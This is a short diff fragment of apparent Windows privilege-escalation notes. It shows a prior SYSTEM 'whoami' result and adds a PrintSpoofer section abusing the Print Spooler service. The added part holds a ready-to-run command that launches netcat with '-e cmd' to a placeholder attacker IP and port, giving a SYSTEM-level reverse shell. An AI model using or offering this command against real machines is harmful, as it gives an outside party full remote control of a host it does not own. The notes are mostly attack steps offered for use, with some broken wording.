@@ -13,6 +13,14 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 
+IF IT NOT WORKED - COPYING NC.EXE TO SAME FILE
+
+1. PrintSpoofer
+Best for Windows Server 2016, 2019, and Windows 10. It leverages the Print Spooler service. Source. 
+
+
+    Reverse Shell (using Netcat):
+    .\PrintSpoofer.exe -c "C:\tools\nc.exe <attacker_ip> <port> -e cmd" 
 
 NOTE:----------------------------------------------------------------------------------
 1. Interactive vs. Non-Interactive
